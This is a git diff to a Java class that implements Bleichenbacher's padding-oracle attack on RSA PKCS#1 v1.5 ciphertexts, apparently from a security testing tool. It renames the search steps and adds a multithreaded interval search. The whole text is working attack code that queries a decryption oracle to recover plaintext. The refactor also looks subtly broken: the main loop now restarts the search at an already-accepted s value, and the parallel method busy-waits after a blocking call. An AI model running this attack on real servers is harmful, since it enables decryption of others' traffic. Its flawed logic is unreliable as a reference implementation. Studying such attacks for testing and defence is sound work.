@@ -18,6 +18,7 @@ import java.security.NoSuchAlgorithmException;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
+import java.util.concurrent.*;
 import javax.crypto.BadPaddingException;
 import javax.crypto.Cipher;
 import javax.crypto.IllegalBlockSizeException;
@@ -89,7 +90,99 @@ public class Bleichenbacher extends Pkcs1Attack {
      * @param outerKey the rsa-public-key for the outer encryption, encrypting the generated s-value
      * @return the smallest s-value, which generates a valid PKCS#1 Ciphertext
      */
-    private BigInteger find_smallest_s(
+    private BigInteger step2b(
+            BigInteger lowerBound,
+            byte[] ciphertext,
+            CustomRsaPublicKey rsaPublicKey,
+            CustomRsaPublicKey outerKey) {
+
+        BigInteger s = lowerBound;
+        boolean oracleResult;
+
+        while (true) {
+            BigInteger attempt =
+                    manipulateCiphertext(
+                            s,
+                            rsaPublicKey.getPublicExponent(),
+                            rsaPublicKey.getModulus(),
+                            ciphertext);
+
+            if (outerKey != null) {
+                BigInteger encryptedAttempt = encryptBigInt(attempt, outerKey);
+
+                oracleResult = queryOracle(encryptedAttempt, true);
+                counterInnerBleichenbacher++;
+
+            } else {
+                oracleResult = queryOracle(attempt, false);
+
+                if (counterOuterBleichenbacher == 0) {
+                    LOGGER.fatal(
+                            ArrayConverter.bytesToHexString(
+                                    ArrayConverter.bigIntegerToByteArray(attempt)));
+                }
+                counterOuterBleichenbacher++;
+            }
+            if (oracleResult) {
+                LOGGER.fatal(
+                        ArrayConverter.bytesToHexString(
+                                ArrayConverter.bigIntegerToByteArray(attempt)));
+                return s;
+            }
+
+            s = s.add(BigInteger.ONE);
+        }
+    }
+
+    private BigInteger step2b(
+            List<Interval> M,
+            BigInteger previousS,
+            byte[] ciphertext,
+            CustomRsaPublicKey rsaPublicKey,
+            CustomRsaPublicKey outerKey) {
+        LOGGER.info("RUNNING Step 2b");
+        BigInteger nextS;
+        ExecutorService executor = Executors.newFixedThreadPool(M.size());
+
+        List<Callable<BigInteger>> runners = new ArrayList<>();
+
+        for (Interval chosenInterval : M) {
+            Step2cRunner step2cRunner =
+                    new Step2cRunner(
+                            ciphertext,
+                            oracle,
+                            two_B,
+                            three_B,
+                            chosenInterval.lower,
+                            chosenInterval.upper,
+                            previousS,
+                            rsaPublicKey,
+                            outerKey);
+            runners.add(step2cRunner);
+        }
+
+        List<Future<BigInteger>> results;
+        try {
+            results = executor.invokeAll(runners);
+        } catch (InterruptedException e) {
+            throw new RuntimeException(e);
+        }
+        while (true) {
+            for (Future<BigInteger> result : results) {
+                if (result.isDone()) {
+                    try {
+                        nextS = result.get();
+                    } catch (InterruptedException | ExecutionException e) {
+                        throw new RuntimeException(e);
+                    }
+                    executor.shutdownNow();
+                    return nextS;
+                }
+            }
+        }
+    }
+
+    private BigInteger step2a(
             BigInteger lowerBound,
             byte[] ciphertext,
             CustomRsaPublicKey rsaPublicKey,
@@ -145,7 +238,7 @@ public class Bleichenbacher extends Pkcs1Attack {
      * @param outerKey the outer encryption key
      * @return
      */
-    private BigInteger find_s_in_range(
+    private BigInteger step2c(
             BigInteger lowerBound,
             BigInteger upperBound,
             BigInteger previousS,
@@ -456,7 +549,7 @@ public class Bleichenbacher extends Pkcs1Attack {
         }
 
         s =
-                find_smallest_s(
+                step2a(
                         MathHelper.ceil(innerPublicKey.getModulus().add(two_B), M.get(0).upper),
                         ciphertext,
                         innerPublicKey,
@@ -472,16 +565,14 @@ public class Bleichenbacher extends Pkcs1Attack {
 
         while (true) {
             if (M.size() >= 2) {
-                s =
-                        find_smallest_s(
-                                s.add(BigInteger.ONE), ciphertext, innerPublicKey, outerPublicKey);
+                s = step2b(s, ciphertext, innerPublicKey, outerPublicKey);
             } else if (M.size() == 1) {
                 BigInteger a = M.get(0).lower;
                 BigInteger b = M.get(0).upper;
                 if (a.equals(b)) {
                     return ArrayConverter.bigIntegerToByteArray(a);
                 }
-                s = find_s_in_range(a, b, s, ciphertext, innerPublicKey, outerPublicKey);
+                s = step2c(a, b, s, ciphertext, innerPublicKey, outerPublicKey);
             }
             M = updateInterval(M, s, innerPublicKey);
         }
